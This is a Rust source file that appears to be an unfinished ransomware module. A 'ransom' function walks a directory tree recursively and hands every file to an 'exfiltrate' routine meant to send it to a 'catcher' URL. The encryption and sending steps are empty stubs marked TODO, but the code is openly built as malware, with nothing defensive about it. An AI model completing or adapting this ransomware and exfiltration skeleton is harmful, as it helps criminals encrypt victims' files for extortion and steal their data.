use log::{error, info};
use std::{
    fmt,
    fs::{read_dir, DirEntry, File, ReadDir},
    path::PathBuf,
};
type ByteCount = usize;

pub fn ransom(root: &str, catcher: &str) {
    info!("ransom mode");
    let files = read_dir(root);
    if let Ok(entries) = files {
        encrypt_dir(entries, catcher)
    } else {
        error!("could not read {root:?}")
    }
}

#[derive(Debug)]
struct EncryptedFile {
    key: String,
    buf: String,
    path: PathBuf,
}

impl From<DirEntry> for EncryptedFile {
    fn from(value: DirEntry) -> Self {
        let key: String = String::from("");
        let buf: String = String::from("");
        let path: PathBuf = value.path();

        Self { buf, path, key }
    }
}

fn encrypt_dir(files: ReadDir, catcher: &str) -> () {
    for file in files {
        info!("entry {file:?}:");
        if let Ok(entry) = file {
            if let Ok(filetype) = entry.file_type() {
                if filetype.is_dir() {
                    if let Ok(new_files) = read_dir(entry.path()) {
                        encrypt_dir(new_files, catcher)
                    }
                } else {
                    if let Ok(byte_count) = encrypt_file(entry, catcher) {
                        info!("byte count: {byte_count:?}{}", '\n')
                    } else {
                        error!("could not encrypt")
                    }
                }
            } else {
                error!("could not determine file type");
            }
        } else {
            error!("could not open file");
        }
    }
}

fn encrypt_file(file: DirEntry, catcher: &str) -> Result<ByteCount, &'static str> {
    let enc_file = EncryptedFile::from(file);
    exfiltrate(enc_file, catcher)
}

fn exfiltrate(file: EncryptedFile, catcher: &str) -> Result<ByteCount, &'static str> {
    info!("sending {file:?} to URL: {catcher:?}");
    Ok(0) // TODO
}
